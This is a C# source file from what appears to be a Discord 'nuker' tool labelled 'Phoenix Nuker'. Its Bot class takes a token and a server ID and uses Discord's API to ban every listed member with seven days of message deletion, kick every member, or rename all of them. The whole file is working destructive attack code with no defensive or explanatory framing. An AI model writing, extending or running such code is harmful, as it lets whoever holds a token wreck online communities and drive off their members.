﻿using Newtonsoft.Json.Linq;
using Solaris.API;
using System;
using System.Drawing;

public class Bot
{
    public static void BanAllMembers(string token, ulong? gid)
    {
        Colorful.Console.ReplaceAllColorsWithDefaults();
        try
        {
            foreach (dynamic item in JArray.Parse(Request.Send($"/guilds/{gid}/members?limit=1000", "GET", token)))
            {
                Request.Send($"/guilds/{gid}/bans/{item.user["id"]}", "PUT", token, "{\"delete_message_days\": 7, \"reason\": \"Phoenix Nuker\"}", XAuditLogReason: true);
                Colorful.Console.WriteLine($"Banned: {item.user["username"]}#{item.user["discriminator"]}", Color.Lime);
                Config.Sleep(Config.Wait.Short);
            }
        }
        catch (Exception ex)
        {
            Colorful.Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void KickAllMembers(string token, ulong? gid)
    {
        Colorful.Console.ReplaceAllColorsWithDefaults();
        try
        {
            foreach (dynamic item in JArray.Parse(Request.Send($"/guilds/{gid}/members?limit=1000", "GET", token)))
            {
                Request.Send($"/guilds/{gid}/members/{item.user["id"]}", "DELETE", token);
                Colorful.Console.WriteLine($"Kicked: {item.user["username"]}#{item.user["discriminator"]}", Color.Lime);
                Config.Sleep(Config.Wait.Short);
            }
        }
        catch (Exception ex)
        {
            Colorful.Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void ChangeAllNicknames(string token, ulong? gid, string nick)
    {
        Colorful.Console.ReplaceAllColorsWithDefaults();
        try
        {
            foreach (dynamic item in JArray.Parse(Request.Send($"/guilds/{gid}/members?limit=1000", "GET", token)))
            {
                Request.Send($"/guilds/{gid}/members/{item.user["id"]}", "PATCH", token, "{\"nick\":\"" + nick + "\"}", XAuditLogReason: true);
                Colorful.Console.WriteLine($"Renamed: {item.user["username"]}#{item.user["discriminator"]}", Color.Lime);
                Config.Sleep(Config.Wait.Short);
            }
        }
        catch (Exception ex)
        {
            Colorful.Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }
}